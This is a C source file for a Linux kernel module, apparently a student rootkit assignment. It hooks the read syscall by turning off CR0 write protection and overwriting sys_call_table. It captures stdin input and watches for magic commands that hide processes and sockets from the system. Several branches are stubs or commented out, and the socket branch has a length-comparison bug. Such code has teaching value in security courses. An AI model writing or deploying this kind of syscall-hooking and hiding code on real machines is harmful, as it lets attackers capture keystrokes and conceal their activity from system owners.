/*
 * assignment_1.c
 *
 * Hook read syscall and output intercepted data to syslog when reading from stdin.
 * Intercept magic command. When magic command is entered, panic-less reboot.
 *
 */

#include <linux/kallsyms.h>
#include <linux/string.h>
#include <linux/list.h>

#include <linux/slab.h> // for kmalloc

#include <asm/unistd.h> /* contains syscall numbers */
#include <asm/paravirt.h> /* write_cr0 */
#include "hook.h"
/** cmds */
/* Dis-/Enable debugging for this module */
#define DEBUG_MODULE	0

#if DEBUG_MODULE == 0
#undef DEBUG(f_, ...)
#define DEBUG(f_, ...)
#endif

#define HIDE_FD_CMD "hide_fd"
#define UNHIDE_FD_CMD "unhide_fd"

#define HIDE_SOCKET_CMD "hide_socket"
#define UNHIDE_SOCKET_CMD "unhide_socket"

#define HIDE_PS_CMD "hide_ps"
#define UNHIDE_PS_CMD "unhide_ps"

#define HIDE_MOD_CMD "hide_mod"
#define UNHIDE_MOD_CMD "unhide_mod"


#define LINE_BUF_SIZE 200
static void **sys_call_table;

asmlinkage ssize_t (*old_read) (int fd, char *buf, size_t count);

static char line_buf[200];
static int buf_counter = 0;


struct pid_entry {
    char *pid;
    struct list_head list;
};

LIST_HEAD(pid_list);



/* check if line_buf contains cmd */
void check_buf(void){
 	if(buf_counter > 0){
	DEBUG( "%s\n", line_buf);
	if( strncmp(line_buf,HIDE_FD_CMD,strlen(HIDE_FD_CMD)) == 0){
		char *pid_char = &line_buf[strlen(HIDE_FD_CMD)+1];
		struct pid_entry *process = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);
		// get fd number
		
		line_buf[buf_counter] = '\0';
		DEBUG( "hide %s\n",pid_char);
		// add to list
	
		if (!process) {
			return ;
		}
	
		//process->pid = pid_char;

		//list_add(&process->list, &pid_list);

		// hide fd

	} else if (strncmp(line_buf,UNHIDE_FD_CMD,strlen(UNHIDE_FD_CMD)) == 0) {
		// get fd number
		
		// check if in list
		
		// unhide fd
	} else 	if( strncmp(line_buf,HIDE_PS_CMD,strlen(HIDE_PS_CMD)) == 0){
                char *ps_id_char = &line_buf[strlen(HIDE_PS_CMD)+1];
                //struct pid_entry *process = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);
                // get fd number

                line_buf[buf_counter] = '\0';
                DEBUG( "hide %s\n",ps_id_char);
                // add to list
/*
                if (!process) {
                        return ;
                }
*/
               // process->pid = pid_char;

                //list_add(&process->list, &pid_list);

                // hide ps
		add_pid_to_hide(ps_id_char);		


	} else  if( strncmp(line_buf,UNHIDE_PS_CMD,strlen(UNHIDE_PS_CMD)) == 0){
                char *ps_id_char = &line_buf[strlen(UNHIDE_PS_CMD)+1];
                //struct pid_entry *process = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);
                // get fd number

                line_buf[buf_counter] = '\0';
                DEBUG( "unhide %s\n",ps_id_char);
                // add to list
/*
                if (!process) {
                        return ;
                }
*/
               // process->pid = pid_char;

                //list_add(&process->list, &pid_list);

                // hide ps
                remove_pid_to_hide(ps_id_char);            


        } else  if( strncmp(line_buf,HIDE_SOCKET_CMD,strlen(UNHIDE_SOCKET_CMD)) == 0){
                char *ps_id_char = &line_buf[strlen(UNHIDE_SOCKET_CMD)+1];
                int socket_id = simple_strtoul(ps_id_char, NULL, 10);
		//struct pid_entry *process = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);
                // get fd number

                line_buf[buf_counter] = '\0';
                DEBUG( "hide %s\n",ps_id_char);
                // add to list
/*
                if (!process) {
                        return ;
                }
*/
               // process->pid = pid_char;

                //list_add(&process->list, &pid_list);

		
                // hide ps
                add_socket_to_hide(5,socket_id);            


        } else  if( strncmp(line_buf,UNHIDE_SOCKET_CMD,strlen(UNHIDE_SOCKET_CMD)) == 0){
                char *ps_id_char = &line_buf[strlen(UNHIDE_SOCKET_CMD)+1];
                //struct pid_entry *process = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);
                // get fd number
		int socket_id = simple_strtoul(ps_id_char, NULL, 10);
                line_buf[buf_counter] = '\0';
                DEBUG( "unhide %s\n",ps_id_char);
                // add to list
/*
                if (!process) {
                        return ;
                }
*/
               // process->pid = pid_char;

                //list_add(&process->list, &pid_list);

                // hide ps
                remove_port_from_hiding(socket_id);            


        }



	}
}

/*
 *The new read syscall. Will replace old read syscall. It logs g input
 *
 */

asmlinkage ssize_t new_read (int fd, char *buf, size_t count)
{
    /* call old read */
    ssize_t ret;
    ret = old_read(fd,buf,count);

    /* file descriptor has to be 0 (stdin)) */
    if(ret >= 1 && fd == 0)
    {
        int i;

        for(i = 0; i < ret; i++){ 
		if(buf[i] != 13){
			line_buf[buf_counter]=buf[i];
			buf_counter++;
		}else{	
			// check buffer for cmd
			check_buf();
			buf_counter = 0;
		}

        }

    }

    return ret;

}



/*
 * This function is called when the module is loaded.
 */
void initialize_read(void)
{
    /* Find sys_call_table symbol with kallsyms_lookup_name function */
    sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");

    /* disable write protection in control register cr0
     *(Bit 16, when set, the CPU can't write to read-only pages when privilege level is 0 )
     */
    write_cr0 (read_cr0 () & (~ 0x10000));

    /* Save reference to original read pointer */
    old_read = (void *)sys_call_table[__NR_read];

    /* Enter own read syscall in table */
    sys_call_table[__NR_read] = (unsigned long*)new_read;

    /* reenable write protection */
    write_cr0 (read_cr0 () | 0x10000);
}

/*
 * This function is called when the module is unloaded.
 */

void remove_read(void)
{
    /* disable write protection*/
    write_cr0 (read_cr0 () & (~ 0x10000));

    sys_call_table[__NR_read] = (unsigned long *)old_read;
    /* reenable write protection*/
    write_cr0 (read_cr0 () | 0x10000);

 }


